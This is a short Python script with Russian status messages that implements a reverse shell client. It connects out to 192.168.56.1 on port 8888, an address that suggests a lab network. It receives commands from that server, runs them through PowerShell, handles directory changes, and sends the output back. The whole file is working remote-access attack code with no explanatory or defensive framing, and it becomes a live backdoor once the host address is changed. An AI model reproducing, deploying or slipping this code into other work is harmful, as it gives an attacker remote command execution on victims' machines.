import socket
from subprocess import run
from os import chdir, getcwd

HOST = '192.168.56.1'
PORT = 8888

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
    soc.connect((HOST, PORT))
    
    while True:
        output = ''
        server_command = soc.recv(4096).decode('utf-8')
        if server_command == 'exit':
            break

        if server_command.lower().startswith('cd '):
            command_path = server_command[3:]
            try:
                chdir(command_path)
                output = getcwd()
            except Exception as err:
                output = f"[!] Ошибка перехода директории: {err}"
        else:
            try:
                result = run(['powershell', '-Command', f'chcp 65001 > $null; {server_command}'], capture_output=True, text=True, encoding='utf-8')

                if result.stderr:
                    output += result.stderr

                if result.stdout:
                    output += result.stdout

                if not output:
                    output = f'[+] Команда "{server_command}" выполнена успешно'
            except Exception as err:
                output = str(err)

        soc.sendall(output.encode('utf-8'))



    